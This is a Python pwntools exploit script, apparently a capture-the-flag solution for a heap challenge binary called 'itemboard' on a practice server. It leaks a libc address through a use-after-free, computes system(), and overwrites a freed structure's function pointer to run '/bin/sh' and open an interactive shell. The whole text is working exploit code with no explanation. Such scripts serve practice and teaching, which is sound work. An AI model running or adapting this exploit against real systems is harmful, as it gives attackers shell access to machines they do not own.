from pwn import  *
from LibcSearcher import LibcSearcher
from sys import argv

def ret2libc(leak, func, path=''):
	if path == '':
		libc = LibcSearcher(func, leak)
		base = leak - libc.dump(func)
		system = base + libc.dump('system')
		binsh = base + libc.dump('str_bin_sh')
	else:
		libc = ELF(path)
		base = leak - libc.sym[func]
		system = base + libc.sym['system']
		binsh = base + libc.search('/bin/sh').next()

	return (system, binsh)

s       = lambda data               :p.send(str(data))
sa      = lambda delim,data         :p.sendafter(str(delim), str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,'\0'))
uu64    = lambda data               :u64(data.ljust(8,'\0'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))

context.log_level = 'DEBUG'
binary = './itemboard'
context.binary = binary
elf = ELF(binary)
p = remote('node3.buuoj.cn', 27012) if argv[1]=='r' else process(binary)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# start
def add(name,len,content):
	sla(':\n','1')
	sla('?\n',name)
	sla('?\n',str(len))
	sla('?\n',content)

def free(index):
	sla(':\n','4')
	sla('?\n',str(index))

def show(index):
	sla(':\n','3')
	sla('?\n',str(index))

add('chunk0',0x80,'a')
add('chunk1',0x80,'b')
free(0)
show(0)
ru('tion:')
base = uu64(r(6))-88-libc.sym['__malloc_hook']-0x10
leak('base',base)
system = base + libc.sym['system']

free(1)
add('/bin/sh;'+'a'*8+p64(system),0x18,'c')
free(0)
# end

itr()